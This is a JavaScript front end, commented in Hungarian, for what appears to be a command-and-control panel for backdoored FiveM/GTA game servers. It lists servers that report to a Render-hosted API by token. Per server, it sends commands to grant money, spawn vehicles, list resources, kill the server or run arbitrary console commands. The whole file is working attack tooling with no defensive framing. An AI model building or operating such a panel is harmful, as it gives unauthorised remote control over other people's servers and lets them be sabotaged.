// A Render.com-on kapott éles API címed
const API_URL = "https://kyrax-api.onrender.com"; 

/**
 * Frissíti a szerverlistát a Netlify oldalon
 */
async function loadServers() {
    try {
        const response = await fetch(`${API_URL}/list`);
        const servers = await response.json();
        const container = document.getElementById('servers');

        if (servers.length === 0) {
            container.innerHTML = "<p>Nincs aktív szerver a hálózaton...</p>";
            return;
        }

        container.innerHTML = servers.map(srv => `
            <div class="srv-card">
                <div style="border-bottom: 1px solid #00ff41; margin-bottom: 10px;">
                    <h3 style="margin: 0;">${srv.name}</h3>
                    <small>TOKEN: ${srv.token} | Játékosok: ${srv.players || 0}</small>
                </div>
                
                <input type="text" id="target-${srv.token}" placeholder="Játékos ID (Pl: 1)">
                <div class="button-group">
                    <button onclick="sendCommand('${srv.token}', 'money', {amount: 1000000})">💸 1M Cash</button>
                    <button onclick="sendCommand('${srv.token}', 'car', {model: 'zentorno'})">🚗 Spawn Zentorno</button>
                    <button onclick="sendCommand('${srv.token}', 'rpc')">🔮 KYRAX RPC</button>
                    <button onclick="sendCommand('${srv.token}', 'res')" style="background: #f1c40f; color: black;">📂 List Resources</button>
                    <button onclick="sendCommand('${srv.token}', 'kill')" style="background: #e74c3c;">💀 SERVER KILL</button>
                </div>
                
                <div style="margin-top: 10px;">
                    <input type="text" id="custom-cmd-${srv.token}" placeholder="Egyedi konzol parancs...">
                    <button onclick="sendCustom('${srv.token}')" style="background: #3498db;">Futtatás</button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        console.error("Hiba a szerverek betöltésekor:", error);
    }
}

/**
 * Parancsot küld a Node.js API-nak
 */
async function sendCommand(token, action, extra = {}) {
    const id = document.getElementById(`target-${token}`).value;
    
    // Ha kell ID a parancshoz, de nincs megadva
    if ((action === 'money' || action === 'car') && !id) {
        alert("Kérlek adj meg egy Játékos ID-t!");
        return;
    }

    const payload = {
        token: token,
        action: action,
        data: { id: id, ...extra }
    };

    try {
        const response = await fetch(`${API_URL}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log(`Parancs (${action}) sikeresen elküldve: ${token}`);
            // Opcionális: Vizuális visszajelzés
        }
    } catch (error) {
        alert("Hiba a parancs küldésekor! Ellenőrizd a backendet.");
    }
}

/**
 * Egyedi konzol parancs küldése (pl: setjob 1 police 1)
 */
async function sendCustom(token) {
    const cmd = document.getElementById(`custom-cmd-${token}`).value;
    if (!cmd) return;

    await sendCommand(token, 'console', { command: cmd });
    document.getElementById(`custom-cmd-${token}`).value = '';
}

// Automatikus frissítés 5 másodpercenként
setInterval(loadServers, 5000);

// Első betöltés az oldal megnyitásakor
loadServers();
